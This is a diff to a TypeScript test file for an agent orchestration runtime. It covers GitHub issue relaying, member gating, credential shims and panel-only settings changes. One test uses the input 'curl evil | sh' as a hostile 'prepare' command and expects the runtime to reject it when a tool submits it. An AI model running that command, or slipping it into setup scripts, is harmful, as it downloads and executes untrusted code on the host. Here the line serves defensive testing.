@@ -8,6 +8,8 @@ import { afterEach, beforeEach, describe, expect, expectTypeOf, it, vi } from 'v
 import type { UserMessage } from '@deepseek-ai/dsh-llm'
 import { renderPrompt } from '@deepseek-ai/dsh-system-prompt'
 import { Runtime } from '../src/app/runtime.ts'
+import { Setup } from '../src/app/setup.ts'
+import { SetupError } from '../src/setup.ts'
 import { jobRegistry } from './fixtures/host.ts'
 import { evalsHealth } from '../src/app/views/overview.ts'
 import { mandateInstructions } from '../src/executor/dsh.ts'
@@ -18,7 +20,7 @@ import { SCHEMA_VERSION, Store } from '../src/app/store.ts'
 import { TextCache } from '../src/app/cache.ts'
 import { KV } from '../src/kv.ts'
 import { SettingsSchema, policyVersion, type SettingsOrigin } from '../src/policy.ts'
-import { readFileSync, readdirSync, writeFileSync } from 'node:fs'
+import { readFileSync, readdirSync, writeFileSync, mkdirSync } from 'node:fs'
 import { feishuKind } from '../src/sources/feishu.ts'
 import { githubKind, pollRound } from '../src/sources/github.ts'
 import { CliError, Commands } from '../src/infra/commands.ts'
@@ -144,8 +146,8 @@ beforeEach(async () => {
   answers = {
     [`git -C ${directory} rev-parse --show-toplevel`]: `${directory}\n`,
     [`git -C ${directory} remote get-url --push origin`]: 'https://github.com/acme/widgets.git\n',
-    [`${AGENT()} api user`]: '{"login":"agent-bot","id":7}', [`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`]: '{"name":"acme/widgets","push":true}\n',
-    [`${OTHER()} api user`]: '{"login":"agent-bot","id":7}', [`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`]: '{"name":"acme/widgets","push":true}\n',
+    [`${AGENT()} api user`]: '{"login":"agent-bot","id":7}', [`${AGENT()} api repos/acme/widgets --jq {id: .id, name: .full_name, push: .permissions.push}`]: '{"id":42,"name":"acme/widgets","push":true}\n',
+    [`${OTHER()} api user`]: '{"login":"agent-bot","id":7}', [`${OTHER()} api repos/acme/widgets --jq {id: .id, name: .full_name, push: .permissions.push}`]: '{"id":42,"name":"acme/widgets","push":true}\n',
     [`${BOT()} auth status`]: JSON.stringify({ appId: 'cli_bot', brand: 'feishu', identities: { bot: { status: 'ready' } } }),
     [`${BOT()} config strict-mode`]: 'strict-mode: bot (source: profile)',
     [`${BOT()} api GET /open-apis/bot/v3/info --as bot --format ndjson`]: '{"bot":{"open_id":"ou_bot"},"code":0,"msg":"ok"}',
@@ -195,7 +197,7 @@ beforeEach(async () => {
         deliveries({ sessionId, mode, id: message.id, text: message.content.map(block => block.type === 'text' ? block.text : '').join('') })
         agents.get(sessionId)!.status = 'running'
       })
-      agents.set(sessionId, { id: sessionId, ctx: agentCtx, inbox, followup: deliver('queue'), steer: deliver('steer'), status: 'idle', inject: vi.fn(), session: { id: sessionId, header: { agentPreset }, snapshotEvents: () => modelEvents, requestHeader: () => undefined, append: vi.fn((type: string, data: unknown) => { modelEvents.push({ type, data }) }) }, cancel: vi.fn(), whenIdle: async () => {} } as never)
+      agents.set(sessionId, { id: sessionId, ctx: agentCtx, inbox, followup: deliver('queue'), steer: deliver('steer'), status: 'idle', inject: vi.fn(), session: { id: sessionId, header: { agentPreset }, snapshotEvents: () => modelEvents, requestHeader: () => undefined, append: vi.fn((type: string, data: unknown) => { modelEvents.push({ type, data }) }) }, cancel: vi.fn(() => { const current = agents.get(sessionId)!; current.status = 'idle'; ctx.emit('agent/status', { agent: current, status: 'idle' } as never) }), whenIdle: async () => {} } as never)
       bindScopeParent(agents.get(sessionId)!, preset)
     }),
     selectModel: vi.fn(async () => {}), resolveAgent: vi.fn(async id => agents.has(id) ? { agent: agents.get(id) } : { error: { code: 'session/not-found' } }), rename: vi.fn(async () => {}),
@@ -473,7 +475,7 @@ it('treats GitHub comments through the same gate: mentions by members are explic
 
 it('relays an allowed sender\'s mention in a new Issue as an explicit candidate from the poll that reads its notification', async () => {
   const issue = { id: 1012, number: 12, title: 'Login fails', body: '@agent-bot please fix the login', state: 'open',
-    created_at: '2026-09-09T00:00:00Z', html_url: 'https://github.com/acme/widgets/issues/12', user: { login: 'alice', type: 'User' } }
+    created_at: new Date(Date.parse(runtime.store.get(KV.github.cutoff)!) + 1000).toISOString(), html_url: 'https://github.com/acme/widgets/issues/12', user: { login: 'alice', type: 'User' } }
   const notification = { id: 'n1', updated_at: issue.created_at, reason: 'mention', repository: { full_name: 'acme/widgets' },
     subject: { url: 'https://api.github.com/repos/acme/widgets/issues/12', type: 'Issue', title: issue.title } }
   vi.spyOn(Commands.prototype, 'run').mockResolvedValue(`HTTP/2.0 200 OK\r\nX-Poll-Interval: 60\r\n\r\n${JSON.stringify([notification])}`)
@@ -488,7 +490,7 @@ it('relays an allowed sender\'s mention in a new Issue as an explicit candidate 
 
 it('ignores an allowed sender\'s new Issue that does not mention the agent, and an unlisted sender\'s mention, from the poll that reads them', async () => {
   const poll = async (number: number, body: string, login: string) => {
-    const issue = { id: 1000 + number, number, title: 'Login fails', body, state: 'open', created_at: '2026-09-09T00:00:00Z', html_url: `https://github.com/acme/widgets/issues/${number}`, user: { login, type: 'User' } }
+    const issue = { id: 1000 + number, number, title: 'Login fails', body, state: 'open', created_at: new Date(Date.parse(runtime.store.get(KV.github.cutoff)!) + number * 1000).toISOString(), html_url: `https://github.com/acme/widgets/issues/${number}`, user: { login, type: 'User' } }
     const notification = { id: `n${number}`, updated_at: issue.created_at, reason: 'subscribed', repository: { full_name: 'acme/widgets' },
       subject: { url: `https://api.github.com/repos/acme/widgets/issues/${number}`, type: 'Issue', title: issue.title } }
     vi.spyOn(Commands.prototype, 'run').mockResolvedValue(`HTTP/2.0 200 OK\r\nX-Poll-Interval: 60\r\n\r\n${JSON.stringify([notification])}`)
@@ -505,6 +507,22 @@ it('ignores an allowed sender\'s new Issue that does not mention the agent, and 
   const stranger = await poll(13, '@agent-bot please fix the login', 'mallory')
   expect(runtime.store.decisions.byThread('github:13')).toEqual([expect.objectContaining({ kind: 'ignore', reason: [{ code: 'not_a_member', triggerId: stranger }] })])
   expect(relays(runtime.masterId).filter(item => item.kind === 'candidate')).toEqual([])
+})
+
+it('never replays an Issue older than the accepted binding cutoff when the notification cursor is rewound', async () => {
+  const cutoff = runtime.store.get(KV.github.cutoff)!
+  const issue = { id: 1015, number: 15, title: 'Historical issue', body: '@agent-bot historical request', state: 'open',
+    created_at: new Date(Date.parse(cutoff) - 1000).toISOString(), html_url: 'https://github.com/acme/widgets/issues/15', user: { login: 'alice', type: 'User' } }
+  const notification = { id: 'historical', updated_at: issue.created_at, reason: 'mention', repository: { full_name: 'acme/widgets' },
+    subject: { url: 'https://api.github.com/repos/acme/widgets/issues/15', type: 'Issue', title: issue.title } }
+  vi.spyOn(Commands.prototype, 'run').mockResolvedValue(`HTTP/2.0 200 OK\r\nX-Poll-Interval: 60\r\n\r\n${JSON.stringify([notification])}`)
+  vi.spyOn(Commands.prototype, 'gh').mockResolvedValue(issue)
+  vi.spyOn(Commands.prototype, 'pages').mockResolvedValue([])
+  runtime.store.set('github-since', '2020-01-01T00:00:00.000Z')
+  await pollRound(runtime.context(githubKind)); await runtime.idle()
+  expect(runtime.store.get(KV.github.cutoff)).toBe(cutoff)
+  expect(runtime.store.triggers.get(key('github-issue', '15'))).toBeUndefined()
+  expect(relays(runtime.masterId).some(item => item.trigger_id === key('github-issue', '15'))).toBe(false)
 })
 
 it('keeps Issue Triggers stored before Issues arrived through notifications readable on their Thread', async () => {
@@ -829,15 +847,17 @@ it('waits for setup without the agent\'s GitHub CLI: the panel works, and nothin
   expect(next.store.tickets.get(ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'pending'])
   expect(controller.create).not.toHaveBeenCalled()
   expect(deliveries).not.toHaveBeenCalled()
-  // A save that changes nothing records nothing; any other save runs setup again, since it may be the fix, and so does a
-  // check after a fix outside dsh-superagent.
+  // A no-op records nothing. With pending work, an unrelated save cannot silently restart and adopt an execution environment;
+  // a deliberate setup check remains available after an external repair.
   const revision = next.store.get<number>('settings-revision')
   expect(await next.settings.save('policy', next.store.settings().policy, next.store.blockRevision('policy'), 'panel')).toMatchObject({ saved: true, restarting: false })
   expect(next.store.get<number>('settings-revision')).toBe(revision)
-  expect(await next.settings.save('policy', { ...next.store.settings().policy, rules: [] }, next.store.blockRevision('policy'), 'panel')).toMatchObject({ saved: true, restarting: true })
-  await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
+  await expect(next.settings.save('policy', { ...next.store.settings().policy, rules: [] }, next.store.blockRevision('policy'), 'panel'))
+    .rejects.toThrow('Pause and drain managed work')
+  expect(next.store.get<number>('settings-revision')).toBe(revision)
+  expect(restarts).not.toHaveBeenCalled()
   next.checkSetup()
-  await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(2))
+  await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
 })
 
 it('reports each setup problem where the operator fixes it, and checks the agent CLI the way worker shells run it', async () => {
@@ -846,18 +866,20 @@ it('reports each setup problem where the operator fixes it, and checks the agent
     await next.ready
     expect(next.setupProblem).toMatchObject({ place, code, values })
   }
-  answers[`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":false}\n'
+  answers[`${AGENT()} api repos/acme/widgets --jq {id: .id, name: .full_name, push: .permissions.push}`] = '{"id":42,"name":"acme/widgets","push":false}\n'
   await needs('github', 'repositoryReadOnly', { account: 'agent-bot', repository: 'acme/widgets' })
-  answers[`${AGENT()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
+  answers[`${AGENT()} api repos/acme/widgets --jq {id: .id, name: .full_name, push: .permissions.push}`] = '{"id":42,"name":"acme/widgets","push":true}\n'
   // The agent CLI runs in the workers' environment: without the shims on PATH.
   const check = subprocess.spawn.mock.calls.map(([spec]) => spec.argv).find(argv => argv.includes(AGENT()))!
   expect(check[0]).toBe('env')
   expect(check[1]!.startsWith('PATH=')).toBe(true)
   expect(check[1]!.slice('PATH='.length).split(':')).not.toContain(join(directory, 'worker-bin'))
   const valid = { ...answers }
-  // git older than 2.32 ignores GIT_CONFIG_GLOBAL and reads the operator's configuration.
-  answers = { ...valid, [HELPERS]: 'file:/home/me/.gitconfig\0!gh auth git-credential\0' }
+  // Native staging now verifies Git via isolated execFile, not the DSH subprocess double.
+  // Runtime presentation uses its public stage seam; Setup's own test exercises an actual old-Git executable.
+  const stage = vi.spyOn(Setup.prototype, 'stage').mockRejectedValueOnce(new SetupError('gitTooOld'))
   await needs('deployment', 'gitTooOld', {})
+  stage.mockRestore()
   await needs('github', 'repositoryUnset', {}, { github: { repository: '' } })
   // A broken Feishu bot leaves Feishu out and says why; GitHub work goes on.
   answers = { ...valid, [`${BOT()} config strict-mode`]: 'strict-mode: off (source: profile)' }
@@ -870,14 +892,18 @@ it('reports each setup problem where the operator fixes it, and checks the agent
 
 it('reports a failure to write the agent environment as environmentFailed and leaves this process\'s environment as it was', async () => {
   await runtime.stop()
-  // The shim directory cannot be made: a file has its name.
-  rmSync(join(directory, 'worker-bin'), { recursive: true, force: true })
-  writeFileSync(join(directory, 'worker-bin'), '')
+  // A new immutable generation cannot be staged: its parent is an owned fixture file, not a directory.
+  const generations = join(directory, 'generations')
+  expect(generations.startsWith(directory + '/')).toBe(true)
+  rmSync(generations, { recursive: true, force: true })
+  writeFileSync(generations, '')
   const environment = { ...process.env }
   const next = await restart()
   await next.ready
   expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'environmentFailed',
-    values: { output: expect.stringContaining('EEXIST') } })
+    values: { output: 'Execution environment could not be verified' } })
+  expect(readFileSync(generations, 'utf8')).toBe('')
+  expect(next.configured()).toBe(false)
   expect(process.env).toEqual(environment)
 })
 
@@ -887,7 +913,8 @@ it('checks only the account a Source save changes, so a problem setup has elsewh
   await next.ready
   expect(next.feishuProblem).toMatchObject({ code: 'feishuUserIdentity' })
   next.sources.register(feishuKind); next.sources.register(githubKind)
-  answers[`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
+  answers[`${OTHER()} api repos/acme/widgets --jq {id: .id, name: .full_name, push: .permissions.push}`] = '{"id":42,"name":"acme/widgets","push":true}\n'
+  await next.settings.pause(true, 'panel'); await next.idle()
   const github = next.settings.block('source:github')
   const value = github.value as { enabled: boolean; config: Record<string, unknown> }
   expect(await next.settings.save('source:github', { ...value, config: { ...value.config, cli: OTHER() } }, github.revision, 'panel'))
@@ -901,37 +928,59 @@ it('lets only the panel change the execution environment, since it decides what 
     for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
   }
   expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
+  await runtime.settings.pause(true, 'panel'); await runtime.idle()
   expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
   expectTypeOf(runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
   expectTypeOf(runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
 })
 
-it('checks a changed account CLI before saving it, restarts after the save, and lets only the panel change it', async () => {
+it('checks a changed account CLI before saving it, restarts after explicit confirmation, and lets only the panel change it', async () => {
+  const activate = async (accounts: Accounts = {}) => {
+    await (await restart({}, accounts)).ready
+    runtime.sources.register(feishuKind); runtime.sources.register(githubKind)
+    const observed = await runtime.accountRuntime.service.refresh()
+    expect(observed.ok).toBe(true)
+    if (observed.ok && observed.planToken) {
+      expect(observed.blockers).toEqual([])
+      expect(await runtime.accountRuntime.service.apply(observed.planToken, true)).toMatchObject({ ok: true })
+      await (await restart({}, accounts)).ready
+      runtime.sources.register(feishuKind); runtime.sources.register(githubKind)
+    }
+    expect(runtime.configured()).toBe(true)
+    await runtime.idle()
+    expect(runtime.accountRuntime.blockers()).toMatchObject({ paused: true, items: [] })
+  }
   const save = (config: Record<string, unknown>, origin: SettingsOrigin = 'panel') => runtime.settings.save('source:github',
     { enabled: true, config: { ...runtime.store.settings().sources.github!.config, ...config } }, runtime.store.blockRevision('source:github'), origin)
   await expect(save({ cli: OTHER() }, 'tool')).rejects.toThrow('can only be changed in the management panel')
-  answers[`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":false}\n'
+  await runtime.settings.pause(true, 'panel'); await runtime.idle()
+  answers[`${OTHER()} api repos/acme/widgets --jq {id: .id, name: .full_name, push: .permissions.push}`] = '{"id":42,"name":"acme/widgets","push":false}\n'
   await expect(save({ cli: OTHER() })).rejects.toMatchObject({ code: 'repositoryReadOnly', values: { account: 'agent-bot' } })
   expect(restarts).not.toHaveBeenCalled()
-  answers[`${OTHER()} api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}`] = '{"name":"acme/widgets","push":true}\n'
+  answers[`${OTHER()} api repos/acme/widgets --jq {id: .id, name: .full_name, push: .permissions.push}`] = '{"id":42,"name":"acme/widgets","push":true}\n'
   expect(await save({ cli: OTHER() })).toMatchObject({ saved: true, restarting: true })
   await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
-  // Other fields of the Source take effect without a restart.
+  await activate({ github: { cli: OTHER() } })
+  // Unrelated polling fields do not restart a now-explicitly-activated account generation.
+  const activatedRestarts = restarts.mock.calls.length
   expect(await save({ pollSeconds: 120 })).toMatchObject({ saved: true, restarting: false })
-  expect(restarts).toHaveBeenCalledTimes(1)
-  expect((await runtime.settings.save('executor', { ...runtime.store.settings().executor, prepare: 'true' }, runtime.store.blockRevision('executor'), 'panel')).restarting).toBe(false)
+  expect(restarts).toHaveBeenCalledTimes(activatedRestarts)
+  expect((await runtime.settings.save('executor', { ...runtime.store.settings().executor, prepare: 'true' }, runtime.store.blockRevision('executor'), 'panel')).restarting).toBe(true)
+  await activate({ github: { cli: OTHER() } })
   // A save of another block during the account check is kept: the check runs first, then the save merges.
   const pending = save({ cli: AGENT() })
   await runtime.settings.save('policy', { ...runtime.store.settings().policy, rules: [] }, runtime.store.blockRevision('policy'), 'panel')
   await pending
   expect(runtime.store.settings().policy.rules).toEqual([])
   expect(runtime.store.settings().sources.github!.config).toMatchObject({ cli: AGENT() })
+  await activate()
   const feishuSave = (cli: string) => runtime.settings.save('source:feishu', { enabled: true, config: { ...runtime.store.settings().sources.feishu!.config, cli } },
     runtime.store.blockRevision('source:feishu'), 'panel')
   expect(await feishuSave('')).toMatchObject({ restarting: true })
+  await activate({ feishu: { cli: '' } })
   answers[`${BOT()} config strict-mode`] = 'strict-mode: off (source: profile)'
   await expect(feishuSave(BOT())).rejects.toMatchObject({ code: 'feishuUserIdentity', values: { mode: 'off' } })
-})
+}, 20000)
 
 it('lists Tickets that wait on a person with where to answer them, as the overview does', async () => {
   const { ticket, sessionId } = await acceptedTicket()
@@ -962,54 +1011,79 @@ it('runs setup again while the Feishu bot check failed, and restores the process
   expect(next.feishuProblem?.code).toBe('feishuUserIdentity')
   next.checkSetup()
   await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
-  answers[HELPERS] = 'file:/home/me/.gitconfig\0!gh auth git-credential\0'
+  const stage = vi.spyOn(Setup.prototype, 'stage').mockRejectedValueOnce(new SetupError('gitTooOld'))
   const broken = await restart()
   await broken.ready
   expect(broken.setupProblem).toMatchObject({ place: 'deployment', code: 'gitTooOld' })
+  stage.mockRestore()
   expect(process.env.GIT_CONFIG_GLOBAL).toBeUndefined()
   expect(process.env.PATH?.split(':')).not.toContain(join(directory, 'worker-bin'))
 })
 
 it('writes worker shims and the agent environment from the configuration only, and restores the environment on stop', async () => {
-  const bin = join(directory, 'worker-bin')
+  const bin = runtime.setup.commandEnvironment.PATH!.split(':')[0]!
+  expect(bin).toContain(join(directory, 'generations') + '/')
   expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli'])
   expect(readFileSync(join(bin, 'lark-cli'), 'utf8')).toContain(`exec '${BOT()}'`)
   runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, blockedCommands: ['personal-gh'] } })
   const next = await restart({}, { feishu: null })
   await next.ready
-  expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
-  expect(readFileSync(join(bin, 'personal-gh'), 'utf8')).toContain('personal-gh is blocked in this installation; use gh, which acts as agent-bot.')
-  expect(readFileSync(join(bin, 'lark-cli'), 'utf8')).toContain('lark-cli is unavailable: this installation has no Feishu bot.')
-  expect(readFileSync(join(bin, 'gh'), 'utf8')).toContain(`exec '${AGENT()}'`)
-  expect(readFileSync(workerGitConfig(directory), 'utf8')).toContain(`[credential "https://github.com"]\n\thelper = "${credentialHelper(AGENT())}"`)
-  expect(process.env).toMatchObject({ GIT_CONFIG_GLOBAL: workerGitConfig(directory), GIT_CONFIG_NOSYSTEM: '1' })
+  const newBin = next.setup.commandEnvironment.PATH!.split(':')[0]!
+  expect(newBin).not.toBe(bin)
+  expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli']) // Earlier generation is immutable.
+  expect(readdirSync(newBin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
+  expect(readFileSync(join(newBin, 'personal-gh'), 'utf8')).toContain('personal-gh is blocked in this installation; use gh, which acts as agent-bot.')
+  expect(readFileSync(join(newBin, 'lark-cli'), 'utf8')).toContain('lark-cli is unavailable: this installation has no Feishu bot.')
+  expect(readFileSync(join(newBin, 'gh'), 'utf8')).toContain(`exec '${AGENT()}'`)
+  const gitConfig = next.setup.commandEnvironment.GIT_CONFIG_GLOBAL!
+  expect(readFileSync(gitConfig, 'utf8')).toContain(`[credential "https://github.com"]\n\thelper = "${credentialHelper(AGENT())}"`)
+  expect(process.env).toMatchObject({ GIT_CONFIG_GLOBAL: gitConfig, GIT_CONFIG_NOSYSTEM: '1' })
   expect(process.env.GIT_AUTHOR_NAME).toBeUndefined()
-  expect(process.env.PATH?.split(':')[0]).toBe(bin)
+  expect(process.env.PATH?.split(':')[0]).toBe(newBin)
   await next.stop()
   expect(process.env.GIT_CONFIG_GLOBAL).toBeUndefined()
+  expect(process.env.PATH?.split(':')).not.toContain(newBin)
   expect(process.env.PATH?.split(':')).not.toContain(bin)
 })
 
-it('waits for setup when the shim directory holds a file dsh-superagent did not write, and leaves the file alone', async () => {
-  writeFileSync(join(directory, 'worker-bin', 'my-script'), '#!/bin/sh\n')
+it('leaves foreign legacy shims byte-for-byte untouched and stages a separate owned generation', async () => {
+  const legacy = join(directory, 'worker-bin')
+  mkdirSync(legacy)
+  writeFileSync(join(legacy, 'my-script'), '#!/bin/sh\n')
   const next = await restart()
   await next.ready
-  expect(next.configured()).toBe(false)
-  expect(next.setupProblem).toMatchObject({ place: 'deployment', code: 'foreignFile', values: { file: join(directory, 'worker-bin', 'my-script') } })
-  expect(readFileSync(join(directory, 'worker-bin', 'my-script'), 'utf8')).toBe('#!/bin/sh\n')
+  expect(next.configured()).toBe(true)
+  const activeBin = next.setup.commandEnvironment.PATH!.split(':')[0]!
+  expect(activeBin).not.toBe(legacy)
+  expect(activeBin).toContain(join(directory, 'generations') + '/')
+  expect(readdirSync(activeBin).sort()).toEqual(['gh', 'lark-cli'])
+  expect(readdirSync(legacy)).toEqual(['my-script'])
+  expect(readFileSync(join(legacy, 'my-script'), 'utf8')).toBe('#!/bin/sh\n')
   await next.stop()
 })
 
-it('rewrites the blocked-command shims when the Executor settings change them, without a restart', async () => {
-  const bin = join(directory, 'worker-bin')
+it('stages changed blocked-command shims only after pause, quiescence and a real generation restart', async () => {
+  const bin = runtime.setup.commandEnvironment.PATH!.split(':')[0]!
   const save = (blockedCommands: string[]) => runtime.settings.save('executor', { ...runtime.store.settings().executor, blockedCommands }, runtime.store.blockRevision('executor'), 'panel')
-  expect(await save(['personal-gh'])).toMatchObject({ saved: true, restarting: false })
-  expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
-  await save([])
+  await expect(save(['personal-gh'])).rejects.toThrow('Pause and drain')
+  await runtime.settings.pause(true, 'panel'); await runtime.idle()
+  expect(await save(['personal-gh'])).toMatchObject({ saved: true, restarting: true })
   expect(readdirSync(bin).sort()).toEqual(['gh', 'lark-cli'])
-  // The commands workers need cannot be blocked.
+  await (await restart()).ready
+  const blockedBin = runtime.setup.commandEnvironment.PATH!.split(':')[0]!
+  expect(blockedBin).not.toBe(bin)
+  expect(readdirSync(blockedBin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
+  await runtime.idle()
+  expect(runtime.accountRuntime.blockers()).toMatchObject({ paused: true, items: [] })
+  expect(await save([])).toMatchObject({ saved: true, restarting: true })
+  await (await restart()).ready
+  const unblockedBin = runtime.setup.commandEnvironment.PATH!.split(':')[0]!
+  expect(unblockedBin).not.toBe(blockedBin)
+  expect(readdirSync(unblockedBin).sort()).toEqual(['gh', 'lark-cli'])
+  expect(readdirSync(blockedBin).sort()).toEqual(['gh', 'lark-cli', 'personal-gh'])
+  // The commands workers need cannot be blocked, even while safely paused.
   await expect(save(['gh'])).rejects.toThrow()
-  expect(restarts).not.toHaveBeenCalled()
+  await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(2))
 })
 
 it('tells both roles the execution environment through a generated prompt section, and each worker its own ticket\'s', async () => {
